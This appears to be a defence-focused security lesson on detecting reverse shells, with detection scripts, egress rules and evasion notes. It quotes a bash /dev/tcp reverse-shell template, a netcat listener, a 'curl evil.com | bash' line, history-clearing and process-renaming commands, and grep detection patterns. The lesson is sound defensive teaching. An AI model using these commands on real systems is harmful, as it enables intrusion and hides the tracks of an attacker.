# Lesson 9: Exploitation — Reverse Shells (DEFENSE FOCUSED)

## History & Origins

The term "reverse shell" describes a pattern where a compromised machine initiates an outbound connection to an attacker's machine, rather than the attacker connecting inbound. This reverses the traditional client-server model.

Before firewalls became ubiquitous in the late 1990s, attackers could directly connect to open ports on target machines. The rise of firewalls, NAT, and internal networks made direct inbound connections difficult. The reverse shell was the natural adaptation: make the target call out instead.

The first documented reverse shells appeared in the late 1990s, implemented in Perl and Python. By the early 2000s, they were standardized in penetration testing frameworks like Metasploit. The bash reverse shell (`bash -i >& /dev/tcp/IP/PORT 0>&1`) became famous around 2010 when it was widely shared in hacking forums. Its elegance — requiring only bash, no additional tools — made it the default payload for many web shell attacks.

The MITRE ATT&CK framework categorizes reverse shells under T1059.004 (Unix Shell) and T1071.001 (Application Layer Protocol: Web Protocols). Understanding this technique is critical for defenders because it represents the most common post-exploitation communication channel.

## Anatomy of a Reverse Shell (FOR UNDERSTANDING DEFENSE)

### The Bash Reverse Shell Mechanism

For educational understanding, a bash reverse shell works as follows:

1. The attacker's machine listens on a port (e.g., with `nc -lvnp 4443`)
2. The target machine runs bash with its I/O redirected through a network connection
3. Bash reads commands from the network (stdin), sends output to the network (stdout), and errors to the network (stderr)
4. The attacker gets an interactive shell

The key components that DEFENDERS need to understand:
- Outbound TCP connection to an external host
- Redirection of shell I/O (stdin, stdout, stderr) to the socket
- Use of `/dev/tcp` or external tools like `nc`, `python`, `perl`

### How Attackers Think

Attackers need a reverse shell to:
1. **Bypass inbound firewalls:** Most networks block incoming connections but allow outgoing
2. **Establish persistence:** The connection can be made resilient with reconnection logic
3. **Pivot to internal networks:** From the compromised host, attack internal systems
4. **Exfiltrate data:** The connection provides a channel for data theft

Attackers consider these factors when choosing a reverse shell method:
- What tools are available on the target? (`bash`, `python`, `perl`, `nc`, `socat`)
- What protocols are allowed outbound? (HTTP/HTTPS on 443, DNS on 53, SSH on 22)
- Is the connection encrypted? (Plaintext is detectable by IDS; TLS/SSH is stealthier)
- How often does the target check in? (Continuous connection vs interval-based)

## Detection Methods

### Example 1: Detecting Suspicious bash Processes

```bash
$ # Check all bash processes for network connections
$ for pid in $(pgrep bash 2>/dev/null); do
>   if ls -la /proc/$pid/fd/ 2>/dev/null | grep -q socket; then
>     echo "POTENTIAL REVERSE SHELL: PID $pid"
>     ls -la /proc/$pid/fd/
>     echo "Command: $(cat /proc/$pid/cmdline | tr '\0' ' ')"
>     echo "Connections:"
>     cat /proc/$pid/net/tcp 2>/dev/null
>   fi
> done
```

**What this detects:** Any bash process with a file descriptor pointing to a socket. This is the hallmark of a bash reverse shell.

**What this misses:** Renamed processes, bash in a chroot, reverse shells using other interpreters (python, perl).

### Example 2: Using ss to Find Unusual Outbound Connections

```bash
$ # List all established outbound connections with process info
$ ss -tupn | grep -E 'ESTAB' | grep -v ':443|:80|:53'
$ # This shows anything not going to common ports
$ # Focus on connections from non-service users:
$ ss -tupn | awk 'NR>1 {
>   split($7, a, ",")
>   if(a[1] ~ /uid=[0-9]/ && $0 !~ /:https|:http|:domain/)
>     print "Suspicious:", $0
> }'
```

**What this detects:** Outbound connections to non-standard ports, especially from users who shouldn't have network services.

**What this misses:** Connections masquerading as HTTPS (port 443) or DNS (port 53) with tunnels.

### Example 3: Monitoring with lsof

```bash
$ # Find all processes with sockets connected to specific ports
$ lsof -i -n -P 2>/dev/null | grep -E '(ESTABLISHED|LISTEN)' | \
>   awk '{print $1, $2, $3, $8, $9}' | sort -u
```

**What this detects:** All open network connections with process names and PIDs.

### Example 4: Detecting Reverse Shell One-Liners in Logs

```bash
$ # Search shell history for known patterns
$ patterns=(
>   '/dev/tcp/.*0>&1'
>   'bash.*-i.*>&'
>   'exec.*/dev/tcp'
>   'socket.*connect'
> )
$ for pattern in "${patterns[@]}"; do
>   grep -rn "$pattern" /home/*/.bash_history /root/.bash_history 2>/dev/null
> done

$ # Also check syslog for unusual shell activity
$ grep -i 'bash.*-c\|sh.*-c\|/dev/tcp\|socket(' /var/log/auth.log 2>/dev/null
```

**What this detects:** Historical commands in bash history that match reverse shell patterns.

**What this misses:** History is per-user and can be cleared. Attackers often use `unset HISTORY` or edit the file.

### Example 5: Comprehensive Process and Socket Scanner

```bash
$ cat > revshell_detect.sh << 'EOF'
#!/bin/bash
# Defense-focused reverse shell detector
echo "=== Reverse Shell Detection Scan ==="
echo "Timestamp: $(date)"
echo "Host: $(hostname)"
echo

# Check 1: Processes with socket FDs
echo "[CHECK 1] Processes with socket file descriptors..."
for shell in bash sh python perl ruby lua php; do
  for pid in $(pgrep -x "$shell" 2>/dev/null); do
    if [ -d /proc/$pid/fd ]; then
      for fd in /proc/$pid/fd/*; do
        target=$(readlink "$fd" 2>/dev/null)
        if [[ "$target" == *socket:* ]]; then
          echo "  HIGH: $shell (PID $pid) has socket FD: $target"
          echo "  Cmdline: $(tr '\0' ' ' < /proc/$pid/cmdline 2>/dev/null)"
          # Check connection details
          inode=${target#*:}
          grep "$inode" /proc/$pid/net/tcp 2>/dev/null | awk '{
            split($2, local, ":")
            split($3, remote, ":")
            printf "  Local: %d.%d.%d.%d:%d\n", \
              strtonum("0x"substr(local[1],7,2)), \
              strtonum("0x"substr(local[1],5,2)), \
              strtonum("0x"substr(local[1],3,2)), \
              strtonum("0x"substr(local[1],1,2)), \
              strtonum("0x"local[2])
            printf "  Remote: %d.%d.%d.%d:%d\n", \
              strtonum("0x"substr(remote[1],7,2)), \
              strtonum("0x"substr(remote[1],5,2)), \
              strtonum("0x"substr(remote[1],3,2)), \
              strtonum("0x"substr(remote[1],1,2)), \
              strtonum("0x"remote[2])
          }' 2>/dev/null
        fi
      done
    fi
  done
done

# Check 2: Unexpected outbound connections
echo
echo "[CHECK 2] Unexpected outbound connections..."
ss -tupn 2>/dev/null | awk 'NR>1 && /ESTAB/ {
  split($5, dest, ":")
  port = dest[length(dest)]
  # Known safe ports (customize as needed)
  if(port != 443 && port != 80 && port != 53 && port != 22 && port != 123)
    print "  SUSPICIOUS: " $0
}'

# Check 3: History analysis
echo
echo "[CHECK 3] Shell history analysis..."
for hist in /home/*/.bash_history /root/.bash_history; do
  [ -f "$hist" ] || continue
  user=$(echo "$hist" | cut -d/ -f3)
  suspicious=$(grep -cE '(/dev/tcp|/dev/udp|bash -i|nc.*-e|socket\.)' "$hist" 2>/dev/null)
  if [ "$suspicious" -gt 0 ]; then
    echo "  User $user: $suspicious suspicious commands found"
  fi
done

echo
echo "=== Scan Complete ==="
EOF
```

### Example 6: Egress Monitoring with iptables

```bash
$ # Log outbound connections from non-service users
$ iptables -A OUTPUT -m owner --uid-owner 1000 -p tcp --dport 1:1023 -j LOG \
    --log-prefix "OUTBOUND_NON_SVC: " --log-uid
$ # Block all outbound except through whitelisted proxy/ports
$ iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
$ iptables -A OUTPUT -p udp --dport 53 -j ACCEPT  # DNS
$ iptables -A OUTPUT -p tcp --dport 80,443 -j ACCEPT  # Web
$ iptables -A OUTPUT -m owner --uid-owner 0 -j ACCEPT  # Root
$ iptables -A OUTPUT -j DROP  # Default deny
```

### Example 7: Detecting Encrypted Tunnels

```bash
$ # Detect SSH tunnels (often used for persistent reverse shells)
$ ps aux | grep 'ssh.*-R\|ssh.*-L\|ssh.*-D'
$ # Detect socat/ncat SSL tunnels
$ ps aux | grep 'socat\|ncat'
$ # Check for unusual SSL/TLS connections
$ ss -tupn | grep ':443' | awk '{print $5}'
$ # Correlate with known servers
```

### Example 8: Process Tree Analysis for Suspicious Ancestry

```bash
$ # Look for shells spawned by non-shell parents
$ for pid in $(pgrep -x bash sh 2>/dev/null); do
>   ppid=$(awk '/PPid/ {print $2}' /proc/$pid/status 2>/dev/null)
>   pname=$(cat /proc/$ppid/comm 2>/dev/null)
>   if [[ ! "$pname" =~ ^(bash|sh|zsh|login|sshd|tmux|screen|systemd)$ ]]; then
>     echo "SUSPICIOUS: bash (PID $pid) spawned by $pname (PID $ppid)"
>     echo "  Chain: $(cat /proc/$pid/cmdline | tr '\0' ' ')"
>   fi
> done
```

### Example 9: Auditd Rule for Reverse Shell Detection

```bash
$ # Add audit rule to monitor execve of shell with network arguments
$ auditctl -a always,exit -F arch=b64 -S execve -F key=shell_detect \
    -F a0=~bash -F a1=~'*-i*' -F a1=~'*>/dev/tcp*'

$ # Monitor all socket-related syscalls from bash
$ auditctl -a always,exit -F arch=b64 -S connect -F exe=/bin/bash -F key=bash_connect
```

### Example 10: DNS Tunneling Detection

```bash
$ # Look for unusual DNS query patterns
$ tcpdump -n -i any port 53 2>/dev/null | awk '{
>   # Extract domain from DNS query
>   if(/A\?/) {
>     domain = $NF
>     gsub(/\.$/, "", domain)
>     # Check for high entropy subdomains (base32-like)
>     if(length(domain) > 50) print "Possible DNS tunnel:", $0
>   }
> }'
```

## Understanding Evasion Techniques (TO DEFEND AGAINST THEM)

Attackers constantly modify their techniques to evade detection. Defenders must understand these evasions:

1. **Process renaming:** `exec -a httpd bash -c 'payload'` runs bash with argv[0] = "httpd"
2. **Encrypted tunnels:** SSH, socat with SSL, or custom encryption to hide payload content
3. **Port hopping:** Move between ports to evade static port-based detection
4. **Protocol mimicry:** Make the shell traffic look like HTTP, DNS, or other allowed protocols
5. **Memory-only payloads:** No disk writes, no bash history — everything in memory
6. **Timing-based C2:** Check in at random intervals rather than maintaining constant connection
7. **Domain fronting:** Use CDN domains to hide the real C2 server

## Defense Strategy Summary

| Layer | Detection Method | Evasion That Works | Mitigation |
|---|---|---|---|
| Network | Egress filtering | DNS tunneling, domain fronting | Deep packet inspection, DNS sinkhole |
| Host | FD/socket scanning | Process renaming, kernel modules | Mandatory Access Control (SELinux) |
| Logs | History analysis | history -c, HISTFILE unset | Centralized logging with auditd |
| Process | Process tree analysis | Name spoofing, thread injection | Capability dropping, seccomp |
| Filesystem | Watch for suspicious scripts | Memory-only payloads | Read-only rootfs, immutable files |

## Why This Matters

Reverse shells are the most common post-exploitation technique. Every penetration test, every real intrusion, every ransomware attack involves some form of remote shell access. Understanding the technique is not about learning to attack — it's about learning to detect, prevent, and respond.

Defenders who understand reverse shells can:
- Identify compromised hosts faster
- Build effective detection signatures
- Configure firewalls and access controls properly
- Respond to incidents with informed containment strategies
- Educate users about the risks of arbitrary command execution

## Memory Aids

- **"bash + socket = revshell"** — A bash process with a socket FD is the signature of a reverse shell.
- **"Outbound doesn't mean safe"** — Firewalls that block inbound but allow all outbound are the enablers of reverse shells.
- **"Every connection has two ends"** — If you see an unexpected outbound connection, track it at both ends.
- **"Process name is not identity"** — `argv[0]` can be anything; trust `/proc/PID/exe` instead.
- **"History can be rewritten"** — Shell history is not a reliable audit trail. Use auditd.

## Trap Vault

1. **`/dev/tcp` may or may not be compiled in:** Not all bash binaries support `/dev/tcp`. Attackers will use alternative methods if it's not available. Defenders should not assume its absence means safety.

2. **Process name matching is trivial to bypass:** `exec -a randomizedname bash` changes how the process appears. Always check `/proc/PID/exe` readlink for the actual binary.

3. **Outbound connection monitoring on port 443 catches normal traffic:** HTTPS is everywhere. Correlate with process names, connection duration, and destination reputation.

4. **Shell history can be completely disabled:** `export HISTFILE=/dev/null; unset HISTFILE; set +o history` — the absence of history is itself suspicious.

5. **Reverse shells don't need bash:** Python, Perl, Ruby, PHP, Lua, and even `awk` can create reverse shells. A detection system must monitor all interpreters.

6. **Encrypted reverse shells are invisible to content inspection:** SSH tunnels and TLS-wrapped payloads look like normal encrypted traffic. Detection relies on behavioral analysis.

7. **DNS tunnels fool most simple egress filters:** DNS is almost always allowed outbound. Tools like `dnscat2` tunnel shell traffic through DNS queries.

8. **Web shells are a form of reverse shell:** A PHP file on a web server that executes commands and returns output is functionally equivalent. Look for unexpected files in web directories.

9. **Container escapes can lead to host reverse shells:** A reverse shell inside a container can be a pivot point to escape to the host. Monitor containerized processes for outbound networking.

10. **Non-persistent reverse shells are hardest to detect:** Some reverse shells run once, execute a single command, and exit. They never appear in `ss` output long enough to be caught by periodic scans.

11. **Piping to bash is itself a risk:** `curl http://evil.com/payload | bash` downloads and executes a script. Even if no reverse shell is created, the one-liner can execute arbitrary code.

12. **Timing-based detection evasion:** Attackers may disconnect and reconnect at random intervals. Constant monitoring is required, not periodic snapshot scans.

13. **Unix domain sockets can also be used:** Reverse shells don't require TCP; they can use Unix domain sockets for local privilege escalation between processes.

14. **`exec bash` replaces the current process:** After `exec bash`, the process name changes. The original process (e.g., a web server) disappears and is replaced by bash.

15. **Reverse shells via file descriptors 0/1/2:** Some reverse shells use bash's own stdin/stdout/stderr directly without open FDs 3+. Detect these by checking if bash's stdout is a socket.

## See It In The Wild

### Exploring /proc for Reverse Shell Traces
```bash
$ # Check what FDs your own bash has open:
$ ls -la /proc/$$/fd/
$ # Check what connections your system has:
$ cat /proc/net/tcp
$ # Parse: column 2 is local address (hex:port), column 3 is remote (hex:port)
```

### Looking for Real-World Reverse Shell Attempts
```bash
$ # Check auth.log for suspicious command executions
$ grep -i 'bash\|sh\|python' /var/log/auth.log | grep -v 'session' | tail -20

$ # Check for background shells
$ ps aux | grep -E '\b(bash|sh)\b' | grep -v grep
```

### Testing Your Detection (SAFELY, in an isolated environment)
```bash
$ # In a container or VM with no network access to production:
$ docker run --rm -it ubuntu:latest bash
$ # Inside container, simulate what a reverse shell would look like:
$ # (Do NOT connect to anything — just observe the process state)
$ bash -c 'exec 3<>/dev/tcp/127.0.0.1/9999; ls -la /proc/$$/fd/'
$ # Observe that FD 3 is a socket — this is what detectors look for
```

## Check Your Understanding

1. Why do attackers prefer reverse shells over bind shells? What network architecture difference makes reverse shells more reliable?

2. How does an attacker use `/dev/tcp` to create a reverse shell? What kernel-level operations occur when bash opens `/dev/tcp`?

3. What is the difference between detecting a reverse shell by process name vs by `/proc/PID/exe`? Why does process name matching fail?

4. How would an encrypted reverse shell (e.g., through SSH or socat SSL) evade network-based detection?

5. What does `ss -tupn` show that `netstat -tupn` might not? Which tool should you use for modern detection?

6. Why is DNS tunneling effective for reverse shell communication? What makes it hard to block?

7. How would you detect a reverse shell that only runs for 5 seconds to execute a single command and exits?

8. What is the significance of a bash process having a file descriptor pointing to `socket:[inode]`?

9. How does `auditd` help detect reverse shells that shell history monitoring would miss?

10. If you see an outbound connection from a web server to an unknown IP on port 4443, what steps would you take to determine if it's a reverse shell?
